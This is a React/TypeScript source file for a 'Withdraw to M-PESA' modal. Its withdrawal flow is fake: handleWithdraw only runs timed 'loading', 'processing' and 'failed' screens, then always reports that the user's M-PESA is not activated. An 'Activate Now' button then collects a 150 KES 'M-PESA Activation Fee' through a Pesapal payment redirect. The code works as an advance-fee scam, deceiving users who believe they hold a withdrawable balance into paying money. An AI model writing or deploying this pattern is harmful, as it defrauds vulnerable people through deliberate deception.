import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Phone, ArrowRight, X, Loader2, Shield, AlertTriangle, XCircle } from 'lucide-react';

interface WithdrawModalProps {
  isOpen: boolean;
  onClose: () => void;
  maxAmount: number;
}

type WithdrawStatus = 'idle' | 'loading' | 'processing' | 'failed' | 'activation-needed';

export const WithdrawModal: React.FC<WithdrawModalProps> = ({
  isOpen,
  onClose,
  maxAmount
}) => {
  const [amount, setAmount] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [withdrawStatus, setWithdrawStatus] = useState<WithdrawStatus>('idle');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleWithdraw = async () => {
    if (!amount || !phoneNumber || withdrawStatus !== 'idle') return;
    
    // Simulate the withdrawal process
    setWithdrawStatus('loading');
    await new Promise(resolve => setTimeout(resolve, 2000)); // Loading for 2 seconds
    
    setWithdrawStatus('processing');
    await new Promise(resolve => setTimeout(resolve, 2000)); // Processing for 2 seconds
    
    setWithdrawStatus('failed');
    await new Promise(resolve => setTimeout(resolve, 2000)); // Show failure for 2 seconds
    
    setWithdrawStatus('activation-needed');
  };

  const handleActivateNow = async () => {
    try {
      setLoading(true);
      setError(null);

      // Get token
      console.log('Getting token...');
      const tokenResponse = await fetch('/.netlify/functions/get-token');
      
      if (!tokenResponse.ok) {
        const errorData = await tokenResponse.text();
        console.error('Token response:', errorData);
        throw new Error(`Failed to get token: ${errorData}`);
      }

      const tokenData = await tokenResponse.json();
      console.log('Token response:', tokenData);
      
      if (!tokenData.token) {
        throw new Error(`No token in response: ${JSON.stringify(tokenData)}`);
      }

      // Get the callback URL
      const callbackUrl = `${window.location.origin}/.netlify/functions/ipn`;
      console.log('Using callback URL:', callbackUrl);

      // Prepare order data
      const orderData = {
        id: `mpesa_activation_${Date.now()}`,
        currency: 'KES',
        amount: 150.00,
        description: 'M-PESA Activation Fee',
        callback_url: callbackUrl,
        notification_id: '', // Will be set by the server
        branch: 'M-PESA Activation',
        billing_address: {
          email_address: 'customer@example.com',
          phone_number: phoneNumber || '0700000000',
          country_code: 'KE',
          first_name: 'Customer',
          middle_name: '',
          last_name: 'Name',
          line_1: 'Nairobi',
          line_2: '',
          city: 'Nairobi',
          state: '',
          postal_code: '',
          zip_code: '',
        },
      };

      console.log('Submitting order with data:', orderData);

      // Submit order
      const submitResponse = await fetch('/.netlify/functions/submit-order', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          token: tokenData.token,
          orderData,
        }),
      });

      if (!submitResponse.ok) {
        const errorData = await submitResponse.text();
        console.error('Submit response:', errorData);
        throw new Error(`Failed to submit order: ${errorData}`);
      }

      const submitData = await submitResponse.json();
      console.log('Order submitted successfully:', submitData);

      if (submitData.error) {
        throw new Error(`Order submission failed: ${JSON.stringify(submitData.error)}`);
      }

      if (submitData.redirect_url) {
        window.location.href = submitData.redirect_url;
      } else if (submitData.order_tracking_id) {
        window.location.href = `https://pay.pesapal.com/v3/payment/${submitData.order_tracking_id}`;
      } else {
        throw new Error(`No redirect URL in response: ${JSON.stringify(submitData)}`);
      }
    } catch (error) {
      console.error('Payment error:', error);
      setError(error instanceof Error ? error.message : 'Failed to process payment');
    } finally {
      setLoading(false);
    }
  };

  const renderStatusMessage = () => {
    switch (withdrawStatus) {
      case 'loading':
        return (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-blue-50 p-4 rounded-xl space-y-2"
          >
            <div className="flex items-center justify-center space-x-3">
              <Loader2 className="w-6 h-6 text-blue-500 animate-spin" />
              <p className="text-blue-700 font-medium">Initiating withdrawal request...</p>
            </div>
          </motion.div>
        );

      case 'processing':
        return (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-blue-50 p-4 rounded-xl space-y-2"
          >
            <div className="flex items-center justify-center space-x-3">
              <Loader2 className="w-6 h-6 text-blue-500 animate-spin" />
              <p className="text-blue-700 font-medium">Processing your withdrawal...</p>
            </div>
            <div className="w-full bg-blue-200 rounded-full h-1.5">
              <motion.div
                className="bg-blue-500 h-1.5 rounded-full"
                initial={{ width: "0%" }}
                animate={{ width: "100%" }}
                transition={{ duration: 2, ease: "linear" }}
              />
            </div>
          </motion.div>
        );

      case 'failed':
        return (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-red-50 border-l-4 border-red-500 p-4 rounded-xl"
          >
            <div className="flex items-start space-x-3">
              <XCircle className="w-6 h-6 text-red-500 flex-shrink-0" />
              <div>
                <h4 className="font-semibold text-red-800">Withdrawal Failed</h4>
                <p className="text-red-700 text-sm mt-1">
                  Unable to process your withdrawal request at this time.
                </p>
              </div>
            </div>
          </motion.div>
        );

      case 'activation-needed':
        return (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-orange-50 border-l-4 border-orange-500 p-4 rounded-xl space-y-4"
          >
            <div className="flex items-start space-x-3">
              <AlertTriangle className="w-6 h-6 text-orange-500 flex-shrink-0 mt-1" />
              <div>
                <h4 className="font-semibold text-orange-800">M-PESA Not Activated</h4>
                <p className="text-orange-700 text-sm mt-1">
                  Your M-PESA has not been activated to withdraw funds directly from your wallet & savings account.
                  Activate your M-PESA number to withdraw directly.
                </p>
              </div>
            </div>
            
            <motion.button
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={handleActivateNow}
              disabled={loading}
              className={`w-full py-3 px-4 rounded-xl font-medium flex items-center justify-center space-x-2
                ${loading ? 'bg-gray-100 text-gray-400 cursor-not-allowed' : 
                'bg-gradient-to-r from-orange-500 to-orange-600 text-white shadow-lg shadow-orange-500/20 hover:from-orange-600 hover:to-orange-700'}`}
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Processing...</span>
                </>
              ) : (
                <>
                  <Shield className="w-5 h-5" />
                  <span>Activate Now</span>
                </>
              )}
            </motion.button>
            
            {error && (
              <div className="text-red-600 text-sm mt-2">
                {error}
              </div>
            )}
          </motion.div>
        );

      default:
        return null;
    }
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4"
        >
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            className="bg-white rounded-2xl max-w-md w-full relative overflow-hidden shadow-lg shadow-gray-500/20"
          >
            {/* Header with gradient */}
            <div className="bg-gradient-to-r from-green-400 to-emerald-600 p-6">
              <div className="flex justify-between items-center">
                <h3 className="text-xl font-bold text-white">Withdraw to M-PESA</h3>
                <button
                  onClick={onClose}
                  className="text-white/80 hover:text-white transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
              <p className="text-white/80 mt-2">Available balance: KES {maxAmount.toLocaleString()}</p>
            </div>

            <div className="p-6 space-y-6">
              {/* Phone Number Input */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  M-PESA Phone Number
                </label>
                <div className="relative">
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    placeholder="Enter your M-PESA number"
                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 
                      focus:ring-green-500 focus:border-transparent transition-all pl-12"
                  />
                  <Phone className="w-5 h-5 text-gray-400 absolute left-4 top-1/2 -translate-y-1/2" />
                </div>
              </div>

              {/* Amount Input */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Amount to withdraw
                </label>
                <div className="relative">
                  <input
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    max={maxAmount}
                    placeholder="Enter amount"
                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 
                      focus:ring-green-500 focus:border-transparent transition-all"
                  />
                  <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400">
                    KES
                  </span>
                </div>
              </div>

              {/* Quick Amount Buttons */}
              <div className="grid grid-cols-3 gap-2">
                {[1000, 2000, 5000].map((quickAmount) => (
                  <motion.button
                    key={quickAmount}
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => setAmount(quickAmount.toString())}
                    className={`px-4 py-2 rounded-lg text-sm font-medium
                      ${Number(amount) === quickAmount ? 
                        'bg-green-100 text-green-700 border-2 border-green-500' : 
                        'bg-gray-50 text-gray-700 border border-gray-200 hover:bg-gray-100'}`}
                  >
                    {quickAmount.toLocaleString()}
                  </motion.button>
                ))}
              </div>

              {/* Status Messages */}
              {renderStatusMessage()}

              {/* Action Button */}
              {withdrawStatus === 'idle' && (
                <motion.button
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  disabled={!amount || !phoneNumber || Number(amount) > maxAmount}
                  onClick={handleWithdraw}
                  className={`w-full py-3 px-4 rounded-xl font-medium flex items-center justify-center space-x-2
                    ${(!amount || !phoneNumber || Number(amount) > maxAmount) ? 
                      'bg-gray-100 text-gray-400 cursor-not-allowed' : 
                      'bg-gradient-to-r from-green-500 to-emerald-600 text-white shadow-lg shadow-green-500/20'}`}
                >
                  <span>Withdraw Now</span>
                  <ArrowRight className="w-4 h-4" />
                </motion.button>
              )}
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};
